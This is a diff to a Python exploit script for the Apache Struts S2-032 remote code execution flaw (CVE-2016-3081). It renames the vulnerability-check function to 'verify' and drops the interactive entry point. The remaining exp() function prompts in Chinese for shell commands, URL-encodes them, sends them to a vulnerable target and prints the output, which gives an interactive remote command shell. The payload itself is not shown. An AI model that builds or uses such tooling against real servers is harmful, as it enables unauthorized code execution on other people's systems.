@@ -3,7 +3,7 @@ import re
 import urllib
 
 
-def s2_032(url):
+def verify(url):
     relsult = {
         'name': 'S2-032 Remote Code Execution Vulnerablity（CVE-2016-3081）',
         'vulnerable': False
@@ -32,7 +32,7 @@ def s2_032(url):
         return relsult
 
 def exp(url):
-    if s2_032(url)['vulnerable']:
+    if verify(url)['vulnerable']:
         while True:
             cmd_shell = input('执行命令:')
             cmd_shell = urllib.parse.quote(cmd_shell)
@@ -42,6 +42,4 @@ def exp(url):
             req = requests.get(vulurl, timeout=3)
             print(req.text)
 
-if __name__ == '__main__':
-    url = input('输入目标URL:')
-    print(exp(url))
+
